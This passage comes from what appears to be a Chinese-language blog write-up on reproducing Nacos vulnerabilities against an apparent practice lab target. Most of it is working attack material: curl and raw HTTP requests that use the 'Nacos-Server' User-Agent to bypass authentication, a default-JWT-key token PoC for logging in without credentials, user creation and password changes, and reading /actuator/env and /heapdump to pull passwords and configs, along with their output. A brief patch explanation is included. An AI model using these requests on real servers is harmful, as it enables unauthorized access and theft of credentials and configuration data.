class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/ns/instance?port=8848&amp;healthy=true&amp;ip=11.11.11.11&amp;weight=1.0&amp;serviceName=nacos.test.3&amp;encoding=GBK&amp;namespaceId=n1&#x27;</span></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/instance/list?serviceName=nacos.test.1&#x27;</span></span><br><span class="line"><span class="comment"># 实情</span></span><br><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/instance?serviceName=nacos.test.2&amp;ip=10.10.10.10&amp;port=8888&amp;cluster=DEFAULT&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>查询服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/service?serviceName=nacos.test.2&#x27;</span></span><br><span class="line"><span class="comment"># 列表</span></span><br><span class="line">curl -X GET <span class="string">&#x27;127.0.0.1:8848/nacos/v1/ns/service/list?pageNo=1&amp;pageSize=2&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>查询命名空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://localhost:8848/nacos/v1/console/namespaces&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="历史漏洞"><a class="markdownIt-Anchor" href="#历史漏洞"></a> 历史漏洞</h2><h3 id="信息泄漏"><a class="markdownIt-Anchor" href="#信息泄漏"></a> 信息泄漏</h3><p>未登录，访问URL，可以获得默认安装后泄漏的内网IP地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8848/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageS%20ize=10&amp;keyword</span><br></pre></td></tr></table></figure><p>未登录，访问URL，可以获得默认安装后的用户列表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8848/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9</span><br></pre></td></tr></table></figure><h3 id="任意用户创建"><a class="markdownIt-Anchor" href="#任意用户创建"></a> 任意用户创建</h3><p>访问<code>http://your-ip:8848/nacos/v1/auth/users</code>。利用POST传参，此处的参数为<code>username=test&amp;password=test</code>，修改<code>User-Agent</code>头为<code>Nacos-Server</code>。发送POST请求，返回码200，成功创建test用户。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://192.168.244.123:8848/nacos/v1/auth/users?username=test1&amp;password=test1</span></span><br></pre></td></tr></table></figure><h3 id="任意用户密码更改"><a class="markdownIt-Anchor" href="#任意用户密码更改"></a> 任意用户密码更改</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://your-ip:8848/nacos/v1/auth/users?accessToken=&#x27;</span> -H <span class="string">&#x27;User-Agent:Nacos-Server&#x27;</span> -d <span class="string">&#x27;username=test1&amp;newPassword=test2&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="后台未授权登录"><a class="markdownIt-Anchor" href="#后台未授权登录"></a> 后台未授权登录</h3><p>漏洞主要由于NACOS使用了默认的JWT key导致的未授权访问漏洞。通过该漏洞，攻击者可以绕过用户名和密码验证直接登录到nacos用户后台。</p><p>poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200</span><br><span class="line">Server: nginx/1.19.6</span><br><span class="line">Date: Sun, 11 Apr 2021 01:48:17 GMT</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Origin</span><br><span class="line">Vary: Access-Control-Request-Method</span><br><span class="line">Vary: Access-Control-Request-Headers</span><br><span class="line">Access-Control-Allow-Origin: http://47.93.46.78:9090</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA</span><br><span class="line">Content-Length: 162</span><br><span class="line"></span><br><span class="line">&#123;&quot;accessToken&quot;:&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA&quot;,&quot;tokenTtl&quot;:18000,&quot;globalAdmin&quot;:true&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发送这个包过去即可</p><h3 id="使用spring-boot获得账号密码"><a class="markdownIt-Anchor" href="#使用spring-boot获得账号密码"></a> 使用Spring Boot获得账号密码</h3><p>参考：<a href="https://blog.csdn.net/qq_45161658/article/details/122848419">https://blog.csdn.net/qq_45161658/article/details/122848419</a></p><h3 id="反序列化漏洞"><a class="markdownIt-Anchor" href="#反序列化漏洞"></a> 反序列化漏洞</h3><p>影响版本</p><ul><li>1.4.0 &lt;= Nacos &lt; 1.4.6</li><li>2.0.0 &lt;= Nacos &lt; 2.2.3</li></ul><p>参考：</p><ul><li><a href="https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian反序列化漏洞分析/</a></li><li><a href="https://www.freebuf.com/vuls/224280.html">https://www.freebuf.com/vuls/224280.html</a></li></ul><p>只能打一次，与协议有关，需要探测hessian版本，拉出依赖。</p><h2 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h2><p>在1.2~1.4.0版本期间，通过User-Agent中是否包含Nacos-Server来进行判断请求是否来自其他服务端，UA头中包含Nacos-Server就可以通过认证访问需要鉴权的接口。所以第一个就是获取其版本。</p><p>从1.4.1版本开始，Nacos添加服务身份识别功能，用户可以自行配置服务端的Identity，不再使用User-Agent作为服务端请求的判断标准。</p><p>配置文件中JWT默认key上面说到了。可以使用JWT章节介绍的来延长JWT过期时间。</p><h3 id="开启auth的汇总"><a class="markdownIt-Anchor" href="#开启auth的汇总"></a> 开启auth的汇总</h3><p><strong>UA头中包含Nacos-Server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&quot; -H &quot;User-Agent: Nacos-Server&quot;</span><br></pre></td></tr></table></figure><p><strong>默认自定义身份识别标志</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&quot; -H &quot;serverIdentity: security&quot;</span><br></pre></td></tr></table></figure><p><strong>账户信息 JWT accessToken</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&amp;username=nacos&amp;password=nacos&quot;</span><br></pre></td></tr></table></figure><p><strong>accessToken</strong></p><p>利用Authorization登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.244.123:8848/nacos/v1/auth/users/login&quot;  -X POST -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTk5NTQzODEyOH0.KSFTu7Cwi3ofgclAFImctUHZERZj6WavjlH37db1FTY&quot; -d &quot;username=nacos&amp;password=1&quot;</span><br></pre></td></tr></table></figure><h1 id="实践"><a class="markdownIt-Anchor" href="#实践"></a> 实践</h1><h2 id="nacos版本-敏感信息"><a class="markdownIt-Anchor" href="#nacos版本-敏感信息"></a> nacos版本、敏感信息</h2><p>呵呵哈哈哈，狂点登录窗口的左上角标志，一直点，可能会偶然进入后台（闪现），就可以看到版本了，呵呵哈哈哈，闪了一下他就退出了。</p><h3 id="版本信息"><a class="markdownIt-Anchor" href="#版本信息"></a> 版本信息</h3><blockquote><p>META-INF, 相当于一个信息包，用于存放一些meta information相关的文件。用来配置应用程序、扩展程序、<a href="https://so.csdn.net/so/search?q=%E7%B1%BB%E5%8A%A0%E8%BD%BD&amp;spm=1001.2101.3001.7020">类加载</a>器和服务<a href="https://www.baidu.com/s?wd=manifest.mf&amp;tn=SE_PcZhidaonwhc_ngpagmjz&amp;rsv_dl=gh_pc_zhidao">manifest.mf</a>文件，在用jar打包时自动生成。</p></blockquote><p>在使用<code>/env</code>接口获取环境列表后，搜索：<code>META-INF</code>或者<code>BOOT-INF</code>可以看到：</p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627123130665.png" alt="image-20230627123130665" /></p><p>如果搜索：version，就会有：参考：<a href="https://www.cnblogs.com/allenwas3/p/12145524.html">https://www.cnblogs.com/allenwas3/p/12145524.html</a></p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627123400166.png" alt="image-20230627123400166" /></p><p>那是不是就不可以获取了？</p><h3 id="env接口获取环境列表并使用heapdump下载查看关键信息"><a class="markdownIt-Anchor" href="#env接口获取环境列表并使用heapdump下载查看关键信息"></a> <code>/env</code>接口获取环境列表，并使用<code>/heapdump</code>下载查看关键信息</h3><p>使用dirsearch可以看到一些未授权接口：<code>dirseach.py -u &lt;ip:port&gt; -r</code>。重要的信息泄漏有：<code>/env</code>和<code>/heapdump</code>接口。</p><blockquote><p>/env接口：会生成应用程序可用的所有环境属性的列表，无论这些属性是否用到。这其中包括环境变量、JVM 属性、命令行参数，以及 application.properties 或 application.yml 文件提供的属性。</p><p>/heapdump接口：当访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret、key等)的属性名对应的属性值用 * 号替换达到脱敏的效果。而此时若是想要找到想要获取的被星号 * 遮掩的属性值对应的属性名可以通过下载heapdump 文件从其中获取信息。heapdump是系统自动生成一个 Jvm 的堆文件，该文件保存了某一时刻JVM堆中对象使用情况，也可能包含着一些密码属性，通过对该文件进行解读可以从获取到nacos的密码。使用<a href="http://www.eclipse.org/mat/downloads.php">MemoryAnalyzer</a>内存查看工具</p></blockquote><p>url访问：<code>http://glkb-qkj2.aqlab.cn/nacos/actuator/env</code></p><p>或者使用curl：<code>curl -X GET 'http://glkb-qkj2.aqlab.cn/nacos/actuator/env'</code></p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627110021514.png" alt="image-20230627110021514" style="zoom:67%;" /><p>看到这里面有密码，访问：</p><p>url访问：<code>http://glkb-qkj2.aqlab.cn/nacos/actuator/heapdump</code></p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627113710829.png" alt="image-20230627113710829" style="zoom:67%;" /><p>放到MemoryAnalyzer中看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).<span class="keyword">contains</span>(&quot;password&quot;))</span><br></pre></td></tr></table></figure><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627122418408.png" alt="image-20230627122418408" /></p><h3 id="尝试获得内网ip"><a class="markdownIt-Anchor" href="#尝试获得内网ip"></a> 尝试获得内网IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://glkb-qkj2.aqlab.cn/nacos/v1/core/cluster/nodes?withInstances=false&amp;pageNo=1&amp;pageS%20ize=10&amp;keyword&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:200,<span class="string">&quot;message&quot;</span>:null,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;ip&quot;</span>:<span class="string">&quot;10.0.0.53&quot;</span>,<span class="string">&quot;port&quot;</span>:8848,<span class="string">&quot;state&quot;</span>:<span class="string">&quot;UP&quot;</span>,<span class="string">&quot;extendInfo&quot;</span>:&#123;<span class="string">&quot;adWeight&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;lastRefreshTime&quot;</span>:1685783927892,<span class="string">&quot;raftMetaData&quot;</span>:&#123;<span class="string">&quot;metaDataMap&quot;</span>:&#123;<span class="string">&quot;naming_instance_metadata&quot;</span>:&#123;<span class="string">&quot;leader&quot;</span>:<span class="string">&quot;10.0.0.53:7848&quot;</span>,<span class="string">&quot;raftGroupMember&quot;</span>:[<span class="string">&quot;10.0.0.53:7848&quot;</span>],<span class="string">&quot;term&quot;</span>:1&#125;,<span class="string">&quot;naming_service_metadata&quot;</span>:&#123;<span class="string">&quot;leader&quot;</span>:<span class="string">&quot;10.0.0.53:7848&quot;</span>,<span class="string">&quot;raftGroupMember&quot;</span>:[<span class="string">&quot;10.0.0.53:7848&quot;</span>],<span class="string">&quot;term&quot;</span>:1&#125;&#125;&#125;,<span class="string">&quot;raftPort&quot;</span>:<span class="string">&quot;7848&quot;</span>,<span class="string">&quot;remoteConnectType&quot;</span>:<span class="string">&quot;GRPC&quot;</span>,<span class="string">&quot;site&quot;</span>:<span class="string">&quot;unknow&quot;</span>,<span class="string">&quot;version&quot;</span>:<span class="string">&quot;2.0.0-ALPHA.1&quot;</span>,<span class="string">&quot;weight&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;,<span class="string">&quot;address&quot;</span>:<span class="string">&quot;10.0.0.53:8848&quot;</span>,<span class="string">&quot;failAccessCnt&quot;</span>:0&#125;]&#125;</span><br></pre></td></tr></table></figure><h3 id="默认安装后泄漏的用户列表"><a class="markdownIt-Anchor" href="#默认安装后泄漏的用户列表"></a> 默认安装后泄漏的用户列表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://glkb-qkj2.aqlab.cn/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9&#x27;</span></span><br><span class="line">&#123;<span class="string">&quot;totalCount&quot;</span>:1,<span class="string">&quot;pageNumber&quot;</span>:1,<span class="string">&quot;pagesAvailable&quot;</span>:1,<span class="string">&quot;pageItems&quot;</span>:[&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;$2a$10<span class="variable">$B3Y43jNaOC3Ie4gRg</span>/ZqpeRl1AGA.ZRpWxB1Lz3RnLb4XM6coVooa&quot;</span>&#125;]&#125; </span><br></pre></td></tr></table></figure><h2 id="鉴权-2"><a class="markdownIt-Anchor" href="#鉴权-2"></a> 鉴权</h2><h3 id="未授权登录"><a class="markdownIt-Anchor" href="#未授权登录"></a> 未授权登录</h3><p>操作：</p><ol><li><p>打开登录页面，随便输入帐号密码，抓包，右击，do intercept，截获返回的数据包，点击forward</p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627111957167.png" alt="image-20230627111957167" /></p></li><li><p>得到结果：</p><p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230627112246712.png" alt="image-20230627112246712" /></p></li><li><p>删除这个框的内容，加上上面的POC，发送即可成功登录。</p></li></ol><h3 id="任意创建用户"><a class="markdownIt-Anchor" href="#任意创建用户"></a> 任意创建用户</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/nacos/v1/auth/users</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ip:8848</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Nacos-Server</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>29</span><br><span class="line"></span><br><span class="line"><span class="language-bash">username=<span class="built_in">test</span>&amp;password=<span class="built_in">test</span></span></span><br></pre></td></tr></table></figure><p>使用apipost发送一下。</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626211035143.png" alt="image-20230626211035143" style="zoom:67%;" /><p>然而登录进去就有flag</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626211307630.png" alt="image-20230626211307630" style="zoom:67%;" /><h3 id="更改用户"><a class="markdownIt-Anchor" href="#更改用户"></a> 更改用户</h3><p>注意data中的键是newPassword，提交方式是PUT</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626212116273.png" alt="image-20230626212116273" style="zoom:67%;" /><h2 id="获取服务信息版本集群列表"><a class="markdownIt-Anchor" href="#获取服务信息版本集群列表"></a> 获取服务信息/版本/集群列表/</h2><p>根据上面的api接口，尝试一下。</p><p>查看存在的server，这里走list。</p><img src="/images/nacos%E5%A4%8D%E7%8E%B0/image-20230626213550278.png" alt="image-20230626213550278" style="zoom:67%;" /><p>其实这算是成功了，靶机里面没啥服务，所以没探出来。</p><p>查看存在的Servlet集群，路径是：<code>/nacos/v1/ns/operator/servers</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;servers&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;ip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">8848</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;state&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UP&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;extendInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;adWeight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;lastRefreshTime&quot;</span><span class="punctuation">:</span> <span class="number">1685783927892</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftMetaData&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;metaDataMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;naming_instance_metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;leader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53:7848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftGroupMember&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;10.0.0.53:7848&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;term&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;naming_service_metadata&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;leader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53:7848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftGroupMember&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="string">&quot;10.0.0.53:7848&quot;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;term&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;raftPort&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;remoteConnectType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GRPC&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;site&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unknow&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0-ALPHA.1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;weight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.0.53:8848&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;failAccessCnt&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>另外，访问集群Leader：<code>/nacos/v1/ns/raft/leader</code>，这个不测了</p><p>测命名空间：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/console/namespaces</span></span><br><span class="line"># or</span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=test_namespace</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;code&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;namespace&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;namespaceShowName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;quota&quot;</span><span class="punctuation">:</span> <span class="number">200</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;configCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="读取配置文件"><a class="markdownIt-Anchor" href="#读取配置文件"></a> 读取配置文件</h2><p>使用apipost，设置Host为Nacos-Server，发送GET请求：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span></span><br><span class="line"># or</span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span></span><br><span class="line"># or导出</span><br><span class="line">http<span class="punctuation">:</span><span class="comment">//glkb-qkj2.aqlab.cn/nacos/v1/cs/configs?export=true&amp;tenant=test_namespace&amp;group=&amp;appName=&amp;ids=</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;totalCount&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pageNumber&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pagesAvailable&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;pageItems&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;639026079587323904&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dataId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;flag&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DEFAULT_GROUP&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8948791476&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;md5&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;tenant&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;appName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"><span 